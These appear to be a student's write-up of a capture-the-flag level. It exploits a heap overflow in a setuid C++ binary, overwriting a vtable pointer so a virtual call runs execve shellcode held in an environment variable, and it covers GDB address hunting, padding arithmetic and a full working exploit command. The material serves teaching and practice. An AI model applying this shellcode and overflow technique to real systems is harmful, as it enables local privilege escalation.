# Level9 - Exam Notes

## 1. Objective
Get a **bonus0** shell. The binary is a C++ setuid program with no direct `system("/bin/sh")` in normal flow. The exploit uses heap overflow + virtual call hijack + shellcode in environment.

## 2. Copy the binary (extraction)
From host:
```bash
scp -P 4242 level9@localhost:level9 ./level9.bin
```

## 3. Reconstructed vulnerability
- `setAnnotation(first, argv[1])` does:
```c
memcpy(first + 4, argv[1], strlen(argv[1]));
```
(no bound)
- Two `N` objects are adjacent on heap.
- Overflow from `a->annotation` reaches `b->vptr`.
- Virtual call later does:
```c
func = *(void **)b;   // b->vptr
func(b, a);           // indirect call
```

## 4. Practical exploitation path (step-by-step)

### 4.1 Shellcode research (reference)
Use known shellcode instead of custom-made one:
- Reference: [shell-storm shellcode-811](https://shell-storm.org/shellcode/files/shellcode-811.html)
- Linux x86 `execve("/bin/sh")` — 28 bytes

Bytes:
```bash
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
```

### 4.2 Shellcode address research (env + NOP sled)
Store shellcode in environment with a large NOP sled:
```bash
env -i payload=$(python -c 'print "\x90"*1000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"') ./level9 AAA
```

Why NOP sled:
```bash
[ shellcode ]
        ↑
        must land EXACTLY here ❌

[ NOP NOP NOP NOP NOP NOP NOP NOP ][ shellcode ]
  ↑         ↑           ↑
  all these addresses work ✅
```

Helper to print env address:
```c
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
    char *p = getenv("payload");
    printf("payload at: %p\n", p);
    return 0;
}
```

Example:
```bash
scp -P 4242 helper.c level9@localhost:/tmp
gcc /tmp/helper.c -o /tmp/helper
env -i payload=$(python -c 'print "\x90"*1000 + "AAAA"') /tmp/helper
# payload at: 0xbffffc03
```

`getenv("payload")` returns the beginning of the NOP sled. With 1000 NOPs, several nearby addresses are valid (`0xbffffc03`, `0xbffffc63`, ...).

### 4.3 Find `a->annotation` address (`a + 4`)
From `main` disassembly:
```bash
0x08048658 <+100>:  mov    %eax,0x14(%esp)   ; a
0x08048660 <+108>:  mov    %eax,0x10(%esp)   ; b
```

In GDB:
```bash
(gdb) break *0x08048664
(gdb) run AAA
(gdb) x/wx $esp+0x14
0xbffff724:     0x0804a008
(gdb) x/wx $esp+0x10
0xbffff720:     0x0804a078
```

So:
- `a = 0x0804a008`
- `a->annotation = a + 4 = 0x0804a00c`
- little-endian: `\x0c\xa0\x04\x08`

### 4.4 Understand the padding (`"B"*104`)
Struct layout:
```c
typedef struct s_n {
    void *vtable;          // 4 bytes
    char annotation[100];
    int value;             // 4 bytes
} N;
```

Distance to reach `b->vptr` from start of `a` data:
- `4 (a->vptr) + 100 (annotation) + 4 (value) = 108`
- first 4 payload bytes are used for shellcode address at `a->annotation[0..3]`
- remaining before `b->vptr`: `108 - 4 = 104`

Payload logic:
```bash
"\x63\xfc\xff\xbf"   → shellcode address
"B"*104              → padding
"\x0c\xa0\x04\x08"   → a->annotation (a+4)
```

### 4.5 Validate redirection in GDB
```bash
(gdb) break *0x08048693
(gdb) run $(python -c 'print "\x63\xfc\xff\xbf" + "B"*104 + "\x0c\xa0\x04\x08"')
```
Check:
- `b->vptr == 0x0804a00c`
- `*(0x0804a00c) == 0xbffffc63` (or chosen NOP sled address)
- `call *%edx` jumps to shellcode.

## 5. Final exploit command
```bash
env -i payload=$(python -c 'print "\x90"*1000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"') ./level9 $(python -c 'print "\x03\xfc\xff\xbf" + "B"*104 + "\x0c\xa0\x04\x08"')
```

If env address differs on your VM, only replace the first 4 bytes (`\x63\xfc\xff\xbf`).